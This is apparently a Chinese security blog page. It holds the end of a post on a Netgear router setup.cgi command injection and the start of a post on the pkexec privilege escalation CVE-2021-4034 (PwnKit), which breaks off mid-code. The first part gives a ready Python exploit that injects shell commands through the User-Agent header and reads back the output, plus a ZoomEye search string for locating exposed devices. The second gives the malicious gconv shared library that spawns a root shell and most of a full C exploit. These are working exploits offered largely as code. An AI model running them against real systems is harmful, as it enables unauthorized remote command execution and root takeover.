<p>CGI（Common Gateway Interface）实际上是一种约定，一种接口协议，可以使用c、python、lua、php来实现。WEB服务器会根据CGI的类型决定如何向CGI程序传递数据，一般都是通过标准输入&#x2F;输出流和环境变量来与CGI程序进行数据传递。例如这个地方的WEB服务器使用的是lighthttpd，通过逆向可以找到有一个函数<code>http_cgi_headers</code>是用来传递给CGI程序的一些环境变量的。</p>
<p><img src="/images/222140260037310.gif" alt="undifined"></p>
<p>如果是使用的POST方式，服务器设定<code>CONTENT_LENGTH</code>环境变量说明POST数据的有效数据字节数，然后CGI通过传递的这个环境变量，从标准输入<code>STDIN</code>中去读取数据。在POC里面，首先token字段值会被注入，然后<code>$(cat)</code>从从标准输入中去读取数据，而此时POST的数据也被传递到了标准输入中，那么就相当于直接执行了POST发出的数据。</p>
<p><strong>payload的另一种写法</strong></p>
<p>如上，是通过环境变量和标准输入传递参数给CGI的，最开始的payload是通过POST请求将数据通过标准输入传递给CGI，而且没有执行结果回显。那么接下来使用GET请求+环境变量+获取执行结果的方式重新来写一次payload。</p>
<p>首先确定将要执行的命令通过哪一个环境变量传入，这个地方选择了<code>User-Agent</code>环境变量，也是经常被使用到的一种方式。其次是决定通过何种方式进行回显，此处是将执行结果写入到<code>/webtmp/</code>文件夹的一个js文件中。由于<code>/webtmp/</code>文件夹和<code>/tmp/</code>是链接起来（固件文件系统中查看）的，因此写入到<code>/webtmp/</code>文件夹，然后使用URL访问<code>/tmp/</code>中的js文件即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.api <span class="keyword">import</span> head</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters</span><br><span class="line">vul_addr = <span class="string">&#x27;https://X.X.X.X&#x27;</span></span><br><span class="line">vul_url = vul_addr + <span class="string">&#x27;/cgi/setup.cgi?token=\&#x27;;$HTTP_USER_AGENT;\&#x27;&#x27;</span></span><br><span class="line">random_str = <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">cmd1 = <span class="built_in">input</span>(<span class="string">&#x27;InputCMD: &#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line">cmd2 = <span class="string">f&#x27;rm /tmp/<span class="subst">&#123;random_str&#125;</span>.js&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">f&#x27;sh -c <span class="subst">&#123;cmd1&#125;</span>&gt;/webtmp/<span class="subst">&#123;random_str&#125;</span>.js&#x27;</span></span><br><span class="line">payload2 = <span class="string">f&#x27;sh -c <span class="subst">&#123;cmd2&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">header = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    header[<span class="string">&#x27;User-Agent&#x27;</span>] = payload1	<span class="comment"># 注入命令并将结果写入到js文件</span></span><br><span class="line">    res = requests.get(vul_url, headers=header, verify=<span class="literal">False</span>,</span><br><span class="line">                       timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>, proxies=proxy)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] command send success&#x27;</span>)</span><br><span class="line">        result_file = vul_addr + <span class="string">f&#x27;/tmp/<span class="subst">&#123;random_str&#125;</span>.js&#x27;</span></span><br><span class="line">        result = requests.get(result_file, timeout=<span class="number">5</span>,</span><br><span class="line">                              verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, proxies=proxy) <span class="comment"># 读取结果js文件</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] get result&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] rm tmp result file&#x27;</span>)</span><br><span class="line">        header[<span class="string">&#x27;User-Agent&#x27;</span>] = payload2</span><br><span class="line">        res = requests.get(vul_url, headers=header, verify=<span class="literal">False</span>,</span><br><span class="line">                           timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>, proxies=proxy)	<span class="comment"># 删除结果js文件</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-190537996.png" alt="undifined"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次的命令注入漏洞逻辑是比较简单的，注入点不需要很长的变量依赖分析。通过对于Netgear几次命令注入漏洞的分析，心中大概也清楚嵌入式设备中路由器大概是怎么获取用户请求数据，然后如何传递给CGI程序进行处理的。</p>
<h2 id="使用zoomeye和pocsuite3"><a href="#使用zoomeye和pocsuite3" class="headerlink" title="使用zoomeye和pocsuite3"></a>使用zoomeye和pocsuite3</h2><h3 id="漏洞影响面"><a href="#漏洞影响面" class="headerlink" title="漏洞影响面"></a>漏洞影响面</h3><p>通过ZoomEye网络空间搜索引擎，搜索ZoomEye dork数据挖掘语法查看漏洞公网资产影响面。</p>
<p><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=?aj4+fileVer">zoomeye dork</a> 关键词：”?aj4+fileVer”</p>
<p><img src="/images/image-2023-0412-190609047.png" alt="undifined"></p>
<p><a target="_blank" rel="noopener" href="https://www.zoomeye.org/globalmap/%3Faj4%2BfileVer/all/0">漏洞影响面全球视角可视化</a></p>
<p><img src="/images/image-2023-0412-190626514.png" alt="undifined"></p>
<h3 id="verify模式"><a href="#verify模式" class="headerlink" title="verify模式"></a>verify模式</h3><p><img src="/images/image-2023-0412-190644223.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-190658814.png" alt="undifined"></p>
<h3 id="attack模式"><a href="#attack模式" class="headerlink" title="attack模式"></a>attack模式</h3><p><img src="/images/image-2023-0412-190712351.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-190726908.png" alt="undifined"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuzhang/p/3929198.html">https://www.cnblogs.com/liuzhang/p/3929198.html</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-202104034%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/CVE-202104034%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-title-link" itemprop="url">CVE-202104034 pkexec权限提升</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 06:55:06 / Modified: 18:59:35" itemprop="dateCreated datePublished" datetime="2023-04-12T06:55:06+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">程序漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="下载源码并编译"><a href="#下载源码并编译" class="headerlink" title="下载源码并编译"></a>下载源码并编译</h2><p>我的 Linux 是 Kali 系统，查看自带的 pkexec 版本，以及下载对应的源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:26:04]</span><br><span class="line">$ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:26:54] C:1</span><br><span class="line">$ dpkg -S pkexec</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-185538532.png" alt="undifined"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:29:34]</span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── debug</span><br><span class="line">├── payload</span><br><span class="line">├── policykit-1_0.105-31+kali1.debian.tar.xz</span><br><span class="line">├── policykit-1_0.105-31+kali1.dsc</span><br><span class="line">├── policykit-1_0.105.orig.tar.gz</span><br><span class="line">└── polkit-0.105</span><br><span class="line"></span><br><span class="line">3 directories, 3 files</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-185558893.png" alt="undifined"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是在解析命令行参数数组 argv 时，发生了数组越界读，随后又发生了数组越界写到环境变量数组，导致第一个环境变量可被修改。接下来会分别从程序正常运行流程和漏洞触发流程进行分析。</p>
<h3 id="正常执行流程"><a href="#正常执行流程" class="headerlink" title="正常执行流程"></a>正常执行流程</h3><p>在 pkexec 工具的 main 函数中，使用如下的 for 循环来处理所有的命令行参数，方式是读取 argv[1] 到 argv[argc] 并进行比较，设置相应的标志位。</p>
<p><img src="/images/image-2023-0412-185615265.png" alt="undifined"></p>
<p>使用了一个断言，argv[argc] 必须为 NULL。从 argv[n] 开始复制字符串到 path 变量中，如果 path 等于 NULL，打印帮助信息并退出；如果 path[0] 不是以 &#x2F; 字符开始的，则从 PATH 环境变量中以 path 字符串搜索应用程序是否存在，并将结果复制到变量 s，如果应用程序存在，则将应用程序路径重新赋值给变量 path 和 argv[n]。main 函数中也会重新构造新的命令行参数列表。</p>
<p><img src="/images/image-2023-0412-185631823.png" alt="undifined"></p>
<p>变量 path 和新的命令行参数会一起送入到 execv 函数执行。</p>
<p><img src="/images/image-2023-0412-185649089.png" alt="undifined"></p>
<h3 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><p>在解析命令行参数的时候，使用了循环变量 n，但是 n 的初始值是 1。如果 pkexec 传入的命令行参数为空，即 argc &#x3D; 1，argv[0] 等于应用程序名，argv[0] &#x3D; NULL。那么当参数解析流程结束时，变量 n &#x3D; 1，那么在此处 argv[1] 存在越界读。</p>
<p><img src="/images/image-2023-0412-185702110.png" alt="undifined"></p>
<p>同样，在此处存在越界写入到 argv[1]。</p>
<p><img src="/images/image-2023-0412-185715716.png" alt="undifined"></p>
<p>当 execve 执行一个新程序的时候，内核会将命令参数指针 argv、环境变量字符串指针 envp 复制到新程序堆栈的中，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------| </span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | </span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| </span><br></pre></td></tr></table></figure>

<p>因为 argv 和 envp 在内存中是连续的，当 argc 等于 0，那么前面所说的 argv[n] &#x3D; argv[1] 也就是 envp[0]。</p>
<p>以上就是漏洞触发的原理，接下来梳理一下漏洞触发的完整流程，假设 pkexec 是通过 execve 调用，设置 argv &#x3D; NULL，envp &#x3D; xxx：</p>
<ol>
<li><p>在 481 行 for 循环中初始化变量 n &#x3D; 1</p>
</li>
<li><p>在 537 行，出现越界读 argv[n] &#x3D; argv[1] &#x3D; envp[0] 到变量 path</p>
<p>那么此时有 path &#x3D; “xxx”</p>
</li>
<li><p>在 546 行，s &#x3D; g_find_program_in_path(path)</p>
<p>s 从环境变量 PATH 中搜索 xxx 程序的绝对路径，假设是 &#x2F;usr&#x2F;bin&#x2F;xxx</p>
</li>
<li><p>在 553 行，出现越界写 argv[n] &#x3D; argv[1] &#x3D; s，即 envp[0] &#x3D; {“&#x2F;usr&#x2F;bin&#x2F;xxx”, …}，环境变量数组第一个元素被覆盖</p>
</li>
</ol>
<p>综上，使用 execve 调用 pkexec，设置命令行参数列表 argv 为 NULL，就可以通过对 envp[0] 进行越界读写。但是，写入的 envp[0] 不会存在很久，因为在源码中会对所有的环境变量进行清除。那么越界写入的环境变量就只能存在于 555~602 行代码中。</p>
<p><img src="/images/image-2023-0412-185733664.png" alt="undifined"></p>
<p>除此之外，Linux 的动态链接器 ld-linux-x86-64.so.2 会在特权程序执行时，清除一些敏感环境变量，其中就包括 GCONV_PATH 以及其他的一些具有动态加载路径的环境变量，防止低权限用户通过这些环境变量利用 SUID 权限程序造成提权。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过之前的分析，知道 pkexec 中存在越界读写环境变量漏洞，但是越界写入的环境变量的生命周期只能从 555~602 行。pkexec 是具有 SUID 权限的，普通用户可以以 root 权限运行 pkexec。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /usr/local/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 64440 Feb  2 02:25 /usr/local/bin/pkexec</span><br></pre></td></tr></table></figure>

<p>在 pkexec 的源码中使用了很多次的 g_printer 函数用于输出错误信息。如果环境变量 CHARSET 不是 UTF-8，g_printer 会调用 glibc 的 iconv_open 函数，将消息转换成 UTF-8。iconv_open 函数的执行流程是：先找到系统提供的 gconv-modules 配置文件，在这个文件中包含了各种字符集相关信息的存储路径，每个字符集的相关信息存储在一个 so 文件中。</p>
<p>综上：gconv-modules 配置文件提供了每个字符集 so 文件所在位置，之后会调用 so 文件中的 gconv 和 gconv_init 函数，如果修改系统的 GCONV_PATH 环境变量，也就能修改 gconv-modules 配置文件的位置，从而执行恶意的 so 文件实现任意命令执行。本质上都是想办法触发 g_printer 函数，调用恶意 so。</p>
<p>利用的流程是：</p>
<ol>
<li><p>创建环境变量指向的目录文件结构</p>
<p>首先创建一个名为 GCONV_PATH&#x3D;. 的文件夹，然后在其中再创建一个名为 GCONV_PATH&#x3D;.&#x2F;lol，以及创建一个目录名为 lol 目录存放恶意的 so 文件。然后再创建一个文件 lol&#x2F;gconv-modules，其中内容为 module UTF-8&#x2F;&#x2F; PWNKIT&#x2F;&#x2F; pwnkit 1。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali @ kali <span class="keyword">in</span> ~/CVEs/CVE-2021-4034/payload [22:09:38]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2</span></span><br><span class="line">.</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── lol</span><br><span class="line">└── lol</span><br><span class="line">    └── gconv-modules</span><br><span class="line"></span><br><span class="line">2 directories, 2 files</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造恶意的 so 文件</p>
<p>在 lol 文件夹中编译一个恶意的 so，代码示例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o payload.so -shared -fPIC payload.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">    setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *a_argv[] = &#123; <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *a_envp[] = &#123; <span class="string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, a_argv, a_envp);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali @ kali <span class="keyword">in</span> ~/CVEs/CVE-2021-4034/payload [22:40:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2</span></span><br><span class="line">.</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── lol</span><br><span class="line">├── lol</span><br><span class="line">│   └── gconv-modules</span><br><span class="line">├── payload.c</span><br><span class="line">└── payload.so</span><br><span class="line"></span><br><span class="line">2 directories, 4 files</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 execve 调用 pkexec 并带入恶意的 envp 环境变量数组</p>
<p>设置恶意环境变量 envp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *a_envp[] = &#123;</span><br><span class="line">	<span class="string">&quot;lol&quot;</span>,					<span class="comment">// 触发越界写，使得a_envp[0]=GCONV_PATH=./lol</span></span><br><span class="line">	<span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,	<span class="comment">// g_find_program_in_path函数查找lol，在给GCONV_PATH=./lol</span></span><br><span class="line">	<span class="string">&quot;CHARSET=PWNKIT&quot;</span>,		<span class="comment">// 触发调用g_printerr函数，从而调用恶意的so文件</span></span><br><span class="line">	<span class="string">&quot;SHELL=lol&quot;</span>, 			<span class="comment">// 调用g_printerr函数，调用恶意so文件</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就使用 execve 调用 pkexec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;pkexec&quot;, NULL, a_envp);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>综上，exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">char</span> *f)</span> &#123;</span><br><span class="line">    perror(f);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">compile_so</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;payload.c&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> so_code[]=</span><br><span class="line">        <span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;stdlib.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;unistd.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  return;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv_init() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  setuid(0); seteuid(0); setgid(0); setegid(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_argv[] = &#123; \&quot;sh\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_envp[] = &#123; \&quot;PATH=/bin:/usr/bin:/sbin\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  execve(\&quot;/bin/sh\&quot;, a_argv, a_envp);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  exit(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fwrite(so_code, <span class="built_in">strlen</span>(so_code), <span class="number">1</span>, f);</span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o payload.so -shared -fPIC payload.c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="type">char</span> *a_argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *a_envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;lol&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=../LOL&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] compile helper..\n&quot;</span>);</span><br><span class="line">    compile_so();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;GCONV_PATH=.&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;GCONV_PATH=./lol&quot;</span>, O_CREAT|O_RDWR, <span class="number">0777</span>); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;lol&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;lol&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FILE *fp = fopen(<span class="string">&quot;lol/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 